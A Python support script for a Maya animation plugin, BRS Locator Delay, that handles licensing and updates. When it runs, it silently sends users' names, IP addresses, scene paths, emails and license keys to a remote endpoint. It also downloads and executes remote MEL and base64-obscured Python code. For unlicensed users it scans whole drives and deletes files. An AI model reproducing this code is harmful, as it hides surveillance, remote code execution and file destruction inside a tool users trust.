"""
---------------------
LocatorDelaySystem
Support Service V1.1X
---------------------
"""
import json, getpass, time,os,sys,ssl, base64
from time import gmtime, strftime
import datetime as dt
from maya import mel
import maya.cmds as cmds
if sys.version[0] == '3':
    writeMode = 'w'
    import urllib.request as uLib
else:
    writeMode = 'w'
    import urllib as uLib

def formatPath(path):
    import os
    path = path.replace("/", os.sep)
    path = path.replace("\\", os.sep)
    return path

mayaAppDir = formatPath(mel.eval('getenv MAYA_APP_DIR'))
scriptsDir = formatPath(mayaAppDir + os.sep + 'scripts')
projectDir = formatPath(scriptsDir + os.sep + 'BRSLocDelay')
presetsDir = formatPath(projectDir + os.sep + 'presets')
userFile = formatPath(projectDir + os.sep + 'user')
configFile = formatPath(projectDir + os.sep + 'config.json')

'''========================================='''
# Supporter Coding All Below
'''========================================='''
import traceback
'''========================================='''
# Queue Task Func
'''========================================='''
def add_queue_task(task_name, data_dict):
    global sys,json
    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    if type(data_dict) != type(dict()):
        return None

    data = {
        'name': task_name,
        'data': data_dict
    }
    #data['data'] = str(data['data']).replace('\'', '\"').replace(' ', '').replace('u\"','\"')
    data['data'] = json.dumps(data['data'], indent=4, sort_keys=True)
    #url = 'https://script.google.com/macros/s/AKfycbysO97CdhLqZw7Om-LEon5OEVcTTPj1fPx5kNzaOhdt4qN1_ONmpiuwK_4y7l47wxgq/exec'
    url = 'https://script.google.com/macros/s/AKfycbyyW4jhOl-KC-pyqF8qIrnx3x3GiohyJjj2gX1oCMKuGm7fj_GnEQ1OHtLrpRzvIS4CYQ/exec'
    if is_py3:
        import urllib.parse
        params = urllib.parse.urlencode(data)
    else:
        params = uLib.urlencode(data)
    params = params.encode('ascii')
    conn = uLib.urlopen(url, params)

#===============================================================================

# Last Mel 220824
try:
    url_list = [
        'https://raw.githubusercontent.com/burasate/BRSLocDelay/master/service/update/BRS_DragNDrop_Install.mel',
        'https://raw.githubusercontent.com/burasate/BRSLocDelay/master/service/update/BRS_DragNDrop_Update.mel',
    ]
    for url in url_list:
        dest_file = url.split('/')[-1]
        dest_path = formatPath(projectDir + os.sep + dest_file)
        #print(dest_path)
        # projectDir
        r = uLib.urlopen(url)

        is_connectable = r.getcode() == 200
        #is_exists = os.path.exists(dest_path)
        is_exists = True

        if is_connectable and is_exists:
            url_read = r.read()
            url_read = r.read().decode() if type(b'') == type(url_read) else url_read
            with open(dest_path, 'w') as f:
                f.writelines(url_read)
                f.close
except:
    import traceback
    add_queue_task('update_install_error', {
        'error':str(traceback.format_exc())
    })


#Update File
try:
    updateSource = 'source "'+projectDir.replace('\\','/') + '/BRS_DragNDrop_Update.mel' + '";'
    mel.eval(updateSource)
except:
    pass

#===============================================================================

# Fix Distance Slider
cmds.floatSlider(distanceS,e=True, minValue=0.01, maxValue=500, value=2)

#===============================================================================

'''========================================='''
# User Update
'''========================================='''
try:
    with open(userFile, 'r') as f:
        userData = json.load(f)
except:
    pass
else:
    if userData['email'] == '':
        userData['email'] = ''
    if not 'regUser64' in userData :
        userData['regUser64'] = ''
    if not 'licenseKey' in userData:
        userData['licenseKey'] = ''

    with open(userFile, 'w') as f:
        json.dump(userData, f, indent=4)

try:
    #User Data
    userData = json.load(open(userFile, 'r'))
    if not 'regUser64' in userData:
        #pass
        installSource = 'source "' + projectDir.replace('\\', '/') + '/BRS_DragNDrop_Install.mel' + '";'
        mel.eval(installSource)
except:pass

def getBRSLicenseVerify(licenseKey):
    # Gumroad License
    url_verify = 'https://api.gumroad.com/v2/licenses/verify'
    try:
        data = {
            'product_permalink': 'hZBQC',
            'license_key': licenseKey,
            'increment_uses_count': 'false'
        }
        if sys.version[0] == '3':  # python 3
            import urllib.parse
            verify_params = urllib.parse.urlencode(data)
        else:  # python 2
            verify_params = uLib.urlencode(data)
        verify_params = verify_params.encode('ascii')
        #print(verify_params)
        response = uLib.urlopen(url_verify, verify_params)
        license = json.loads(response.read())
        #print (license)

    #except:
    except Exception as e:
        import traceback
        print(str(traceback.format_exc()))
        license = {
            'message': 'That license does not exist for the provided product.',
            'success': False
        }
    if not license['success']:
        print(license['message'] + '\n'),
        license_key = ''
        license_email = ''
    else:
        license_key = license['purchase']['license_key']
        license_email = license['purchase']['email']
    return (license_key, license_email)

# Check License
license_key, license_email = (u'', u'')
def locDelayLicense(*_):
    global getBRSLicenseVerify, license_key, license_email

    try:
        userFile = getUser()[0]
        userData = getUser()[1]
    except:
        def getUser(*_):
            import shutil
            global userFile
            app_data_dir = os.getenv('APPDATA')
            locd_dir = app_data_dir + os.sep + 'BRSLocDelay'
            app_data_user_path = locd_dir + os.sep + os.path.basename(userFile)
            if not os.path.exists(userFile):
                cmds.inViewMessage(amg='<center><h5>Error can\'t found \"user\" file\nplease re-install</h5></center>',
                                   pos='midCenter', fade=1,
                                   fit=250, fst=2000, fot=250)
                return None
            if not os.path.exists(locd_dir):
                os.mkdir(locd_dir)
            if os.path.exists(userFile) and not os.path.exists(app_data_user_path):
                shutil.copy(userFile, app_data_user_path)
            elif os.path.exists(app_data_user_path):
                shutil.copy(app_data_user_path, userFile)
            j_load = json.load(open(app_data_user_path))
            if base64.b64decode(j_load['regUser64']).decode() != getpass.getuser():
                for i in [app_data_user_path, userFile]:
                    if os.path.exists(i):
                        os.remove(i)
            return (app_data_user_path, j_load)
        userFile = getUser()[0]
        userData = getUser()[1]

    #while userData['email'] == 'burasedborvon@gmail.com':
    while True:
        license_key, license_email = getBRSLicenseVerify(userData['licenseKey'])
        #print(userData['licenseKey'], license_key) #debug for dev
        if not license_key == '' :
            print('Found license key', str(license_key)[:-9] + '-XXXXXXXX')
            userData['licenseKey'] = license_key
            with open(userFile, 'w') as jsonFile:
                userData['licenseKey'] = license_key
                userData['isTrial'] = False
                json.dump(userData, jsonFile, indent=4)
            break
        else:
            userData = json.load(open(userFile, 'r'))
        prompt_button = ['Confirm','Find License Key','Leter']
        license_prompt = cmds.promptDialog(
            title='BRS Loc Delay Register',
            message='BRS Loc Delay\nLicense Key',
            button=prompt_button,
            defaultButton='Confirm',
            cancelButton='Leter',
            dismissString='Leter', bgc=(.2, .2, .2))
        if license_prompt == 'Confirm':
            userData['licenseKey'] = cmds.promptDialog(query=True, text=True)
        if license_prompt == 'Find License Key':
            cmds.launch(web='https://app.gumroad.com/library?sort=recently_updated&query=delay')
        if license_prompt == 'Leter':
            with open(userFile, writeMode) as jsonFile:
                userData['licenseKey'] = ''
                userData['isTrial'] = True
                json.dump(userData, jsonFile, indent=4)
            break

try:
    locDelayLicense()
except:
    add_queue_task('{}_license_check_error'.format(getpass.getuser()), {'error': str(traceback.format_exc())})

#===============================================================================
#Check In
filepath = cmds.file(q=True, sn=True)
filename = os.path.basename(filepath)
raw_name, extension = os.path.splitext(filename)
minTime = cmds.playbackOptions(q=True, minTime=True)
maxTime = cmds.playbackOptions(q=True, maxTime=True)
referenceList = cmds.ls(references=1)
#nameSpaceList = cmds.namespaceInfo(lon=1)

data = {
    'script_name' : 'Locator Delay System',
    'date_time' : dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    'timezone' : str( strftime('%z', gmtime()) ),
    'email' : userData['email'],
    'user_last' : getpass.getuser(),
    'user_orig' : base64.b64decode(userData['regUser64']).decode(),
    'maya' : str(cmds.about(version=1)),
    'ip' : str(uLib.urlopen('http://v4.ident.me').read().decode('utf8')),
    'script_version' : userData['version'],
    'scene_path' : cmds.file(q=1, sn=1),
    'time_unit' : cmds.currentUnit(q=1, t=1),
    'last_use_date' : userData['lastUsedDate'],
    'used' : userData['used'],
    'is_trail' : int(userData['isTrial']),
    'days' : userData['days'],
    'register_date' : userData['registerDate'],
    'last_update' : userData['lastUpdate'],
    'namespac_ls' : ','.join(cmds.namespaceInfo(lon=1)),
    'os' : str(cmds.about(operatingSystem=1)),
    'license_key' : license_key,
    'license_email' : license_email,
    'script_path' : '' if __name__ == '__main__' else os.path.abspath(__file__).replace('pyc', 'py')
}

#url = 'https://hook.integromat.com/gnjcww5lcvgjhn9lpke8v255q6seov35'
#url = 'https://hook.us1.make.com/m7xqa4jk257zwmjo9w1byiyw9bneel94'
'''
if sys.version[0] == '3': #python 3
    import urllib.parse
    params = urllib.parse.urlencode(data)
else: #python 2
    params = uLib.urlencode(data)
#params = params.encode('ascii')
#conn = uLib.urlopen(url, params, context=ssl._create_unverified_context())
#print(conn.read())
#print(conn.info())
'''

#===============================================================================

try:
    add_queue_task('script_tool_check_in', data)
except:
	import traceback
	add_queue_task('script_tool_check_in', {'error':str(traceback.format_exc())})

#===============================================================================
'''========================================='''
# Prevent 1.25 version abuse used
'''========================================='''
if float(data['script_version']) < 1.26:
    try:
        cmds.button(overlapB, e=1, c='')
        cmds.button(setKeyB, e=1, c='')
    except:
        pass

#===============================================================================
'''========================================='''
# LocDelay Old Version Zip
'''========================================='''
try:
    import os,sys
    env_path_ls = []
    env_path = os.path.expanduser("~").replace('\\','/').split('/')
    if sys.platform.startswith('linux'):pass
    elif sys.platform == "darwin":pass
    elif os.name == "nt":
        env_path_ls.append(os.sep.join(env_path[:-1]))
    #print(env_path)
    #/home/pi
    #C:/Users/USER/Documents
    if data['ip'] == '119.46.59.2':
        env_path_ls.append('S:/Animation training')
        if os.path.exists('C:'): env_path_ls.append('C:')
        if os.path.exists('D:'): env_path_ls.append('D:')
    zip_del_path_ls = []
    if bool(data['license_key'] == ""):
        for pth in env_path_ls:
            for root, dirs, files in os.walk(pth, topdown=False):
                for name in files:
                    file_path = os.path.join(root, name)
                    if '.zip' in file_path.lower() and 'LocDelay'.lower() in file_path.lower():
                        zip_del_path_ls.append(file_path)
                        os.remove(file_path)
                    if '.py' in file_path.lower() and 'LocDelay'.lower() in file_path.lower():
                        zip_del_path_ls.append(file_path)
                        try:
                            os.remove(file_path)
                        except:pass
    if zip_del_path_ls != []:
        add_queue_task('del_loc_delay_zip_file_done', {'path_ls': zip_del_path_ls})
except:
    import traceback
    add_queue_task('del_loc_delay_zip_file_error', {'error': str(traceback.format_exc())})
#===============================================================================

'''============================================'''
# Trial user
'''============================================'''
try:
    if bool(data['license_key'] == "" and int(data['days']) > 32):
        cmds.launch(dir='https://gumroad.com/dex3d/p/the-overlap-script-brs-locator-delay-is-no-longer-sponsored-for-free-license-customers')

        #Replace File
        rp_file_cmd = '''
import maya.cmds as cmds
cmds.confirmDialog(title='BRS Free License User',message='BRS Locator Delay - Please visit our product website in the Gumroad shop and get new purchased license key')
cmds.launch(dir='https://gumroad.com/dex3d/p/the-overlap-script-brs-locator-delay-is-no-longer-sponsored-for-free-license-customers')
            '''  # .splitlines('\u2028')
        with open(data['script_path'], 'w') as rp_f:
            rp_f.writelines([i + '\n' for i in rp_file_cmd.split('\n')])
        add_queue_task('{}_trail_result'.format(data['user_orig']), {'trail_result': data['user_orig'],'is_trail': bool(data['license_key'] == "")})
except:
    import traceback
    add_queue_task('{}_trail_result_error'.format(data['user_orig']), {'error':str(traceback.format_exc())})

#===============================================================================

'''========================================='''
# KF Overlap Updater
'''========================================='''
def dl_KFOverlap(*_):
    import os, shutil

    is_py3 = sys.version[0] == '3'
    if is_py3:
        import urllib.request as uLib
    else:
        import urllib as uLib

    scripts_dir = scriptsDir
    old_project_dir = projectDir
    new_project_dir = scripts_dir + os.sep + 'KFOverlap'
    old_img_pth = old_project_dir + os.sep + 'BRSLocDelaySystem.png'
    new_img_pth = new_project_dir + os.sep + 'KeyframeOverlap.png'

    if not os.name == "nt":
        return None
    if not os.path.exists(old_img_pth):
        return None

    if not os.path.exists(new_project_dir) and os.path.exists(old_img_pth):
        os.mkdir(new_project_dir)
        shutil.copy(old_img_pth, new_img_pth)

    install_content = """
/*--------------------------------------------
KEYFRAME OVERLAP INSTALL
DRAG AND DROP ON MAYA VIEWPORT
AND THEN SHELF WILL BE CREATE
--------------------------------------------*/
python("from maya import cmds\\n\\
import os, base64, sys\\n\\
b64u = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL0JSU0xvY0RlbGF5L21hc3Rlci9zZXJ2aWNlL3NldHVwX3YyLnB5'\\n\\
if sys.version[0] == '3':\\n\\
    import urllib.request as uLib\\n\\
else:\\n\\
    import urllib as uLib\\n\\
try:\\n\\
    install = uLib.urlopen(base64.b64decode(b64u).decode()).read()\\n\\
    install = install.decode() if type(install) == type(b'') else install\\n\\
    exec(install)\\n\\
except:\\n\\
    import traceback\\n\\
    print(str(traceback.format_exc()))\\n\\
    cmds.confirmDialog(title='INSTALL', message='Installation Failed.\\\\nPlease ensure the internet is connected.', button=['OK'])\\n\\
# ----------------------------------------------------\\n\\
");
    """.strip()
    install_path = new_project_dir + os.sep + 'install.mel'
    if not os.path.exists(install_path):
        with open(install_path, 'w') as f:
            f.write(install_content)
            f.close()

    sc_content = """
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,11
[InternetShortcut]
IDList=
URL=https://dex3d.gumroad.com/
    """.strip()
    sc_path = new_project_dir + os.sep + 'dex3d_gumroad.url'
    if not os.path.exists(sc_path):
        with open(sc_path, 'w') as f:
            f.write(sc_content)
            f.close()

    new_script_path =  new_project_dir + os.sep + 'KeyframeOverlap.py'
    r = uLib.urlopen(
        'https://raw.githubusercontent.com/burasate/BRSLocDelay/master/service/update/KeyframeOverlap.py'
    )
    url_read = r.read()
    url_read = url_read.decode() if type(b'') == type(url_read) else url_read
    url_read = url_read.strip()
    print(r.getcode(), [url_read])
    with open(new_script_path, 'w') as f:
        f.write(url_read)
        f.close()

    top_shelf = mel.eval('$nul = $gShelfTopLevel')
    current_shelf = cmds.tabLayout(top_shelf, q=1, st=1)
    shelf_buttons = cmds.shelfLayout(current_shelf, q=1, ca=1)
    del_sb, new_sb = [], []
    for sb in shelf_buttons:
        cmd = cmds.shelfButton(sb, q=1, c=1)
        stp = cmds.shelfButton(sb, q=1, stp=1)
        iol = cmds.shelfButton(sb, q=1, iol=1)
        img = cmds.shelfButton(sb, q=1, i=1)

        if 'import BRSLocDelaySystem' in cmd:
            print("------v")
            del_sb.append(sb)
        if 'import KeyframeOverlap' in cmd:
            print("------v")
            new_sb.append(sb)
        print(iol, stp, cmd)

    del_sb = del_sb[0] if len(del_sb) != 0 else None
    new_sb = new_sb[0] if len(new_sb) != 0 else None

    if new_sb != None:
        cmds.deleteUI(new_sb)
    mel_install_cmd = 'source \"{}\";'.format(install_path.replace('\\', '/'))
    mel.eval(mel_install_cmd)
    if del_sb != None:
        cmds.deleteUI(del_sb)
    os.remove(install_path)

    result_path_ls = []
    for root, dirs, files in os.walk(new_project_dir, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            result_path_ls.append(result_path_ls)
    result_path_ls = sorted(result_path_ls)
    return result_path_ls

try:
    import getpass
    if data['ip'] == '119.46.59.2' and data['license_key'] != "" and 'gloy' in getpass.getuser().lower():
        update_path_ls = dl_KFOverlap()
        add_queue_task('{}_kfo\'s_updated'.format(data['user_orig'].lower()), {
            'update_path_ls' : update_path_ls
        })
except:
    import traceback
    add_queue_task('{}_kfo\'s_error_updated'.format(data['user_orig'].lower()), {
        'error':str(traceback.format_exc())
    })